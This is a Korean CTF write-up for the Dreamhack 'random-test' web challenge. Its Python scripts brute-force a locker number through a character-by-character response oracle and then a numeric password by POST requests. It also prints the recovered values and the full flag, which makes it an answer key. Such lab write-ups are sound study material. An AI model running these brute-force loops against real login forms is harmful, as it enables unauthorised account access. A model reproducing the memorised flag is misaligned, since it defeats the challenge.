# random-test

### 1. VM에 접속한다

사물함 번호와 자물쇠 비밀번호를 입력하는 페이지를 확인한다.

### 2. 입력값과 응답을 분석한다

풀이 코드에서는 `locker_num`과 `password`를 POST 요청으로 전송한다.

사물함 번호는 4자리이며, 응답에 `Good`이 포함되는지를 확인해 한 글자씩 번호를 찾아갈 수 있다고 판단하였다.

**`Good` 응답을 이용해 사물함 번호부터 찾아보자.**

### 3. 사물함 번호를 찾는다

```python
import string
import requests

URL = "http://host3.dreamhack.games:12112/"
locker = ""

for _ in range(4):
    for c in string.ascii_lowercase + string.digits:
        candidate = locker + c
        r = requests.post(URL, data={"locker_num": candidate, "password": ""})
        if "Good" in r.text:
            locker = candidate
            break
    else:
        raise RuntimeError("번호를 찾지 못함")

print("사물함 번호:", locker)
```

영문 소문자와 숫자를 하나씩 대입하여 `Good` 응답이 나오면 해당 문자를 추가한다.

이 과정을 4번 반복한 결과, 사물함 번호는 **`9yuy`**였다.

### 4. 자물쇠 비밀번호를 찾는다

```python
for password in range(100, 201):
    r = requests.post(URL, data={"locker_num": locker, "password": str(password)})
    if "FLAG:" in r.text:
        print("비밀번호:", password)
        print(r.text)
        break
```

확인한 사물함 번호로 비밀번호 **100~200**을 차례대로 대입한다. 응답에 `FLAG:`가 포함된 값을 확인한 결과, 비밀번호는 **`161`**이었다.

### 5. FLAG를 확인한다

![random-test FLAG 확인 화면](../assets/random-test.png)

FLAG: `DH{2e583205a2555b8890d141b51cee41379cead9a65a957e72d4a99568c0a2f955}`
